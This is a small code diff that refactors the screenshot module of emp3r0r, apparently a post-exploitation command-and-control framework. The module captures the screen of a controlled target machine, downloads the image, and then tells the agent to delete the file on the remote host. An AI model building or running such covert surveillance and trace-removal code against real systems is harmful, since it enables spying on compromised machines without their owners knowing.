@@ -14,12 +14,11 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/live"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
-	"github.com/spf13/cobra"
 )
 
-// TakeScreenshot take a screenshot of selected target, and download it
+// moduleScreenshot take a screenshot of selected target, and download it
 // open the picture if possible
-func TakeScreenshot(cmd *cobra.Command, args []string) {
+func moduleScreenshot() {
 	target := agents.MustGetActiveAgent()
 	if target == nil {
 		logging.Errorf("No active agent")
@@ -94,7 +93,7 @@ func ProcessScreenshot(out string, target *def.Emp3r0rAgent) (err error) {
 	}
 
 	// tell agent to delete the remote file
-	err = CmdSender("rm --path"+out, "", target.Tag)
+	err = CmdSender("rm --dst "+out, "", target.Tag)
 	if err != nil {
 		logging.Warningf("Failed to delete remote file %s: %v", strconv.Quote(out), err)
 	}
